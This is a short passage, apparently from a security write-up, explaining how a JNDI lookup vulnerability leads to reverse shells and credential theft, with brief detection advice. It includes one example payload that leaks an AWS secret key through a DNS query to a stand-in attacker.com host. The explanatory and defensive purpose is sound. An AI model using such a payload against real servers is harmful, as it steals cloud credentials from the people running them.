The exploitation of that vulnerability enables the exploitation, installation, and command & control phases of an attack.

The most common payload I see that the victim can download following the exploitation of that vulnerability is a reverse shell that enables the attacker to execute arbitrary commands on the target infected server.

A threat actor could use the DNS interface specifically for data exfiltration without ever downloading a payload. By using a string like `{jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.attacker.com}`, the victim server resolves the environment variable (the AWS secret key) and appends it to a DNS query. The attacker simply monitors their DNS server logs to read the stolen credentials.

Detection:

It is kinda hard to detect that kind of obfuscation patterns because it has no known formats that could be detected using regex.

It is better to work on the detection of the vulnerable servers running the vulnerable library, using codebase scanners like Snyk.
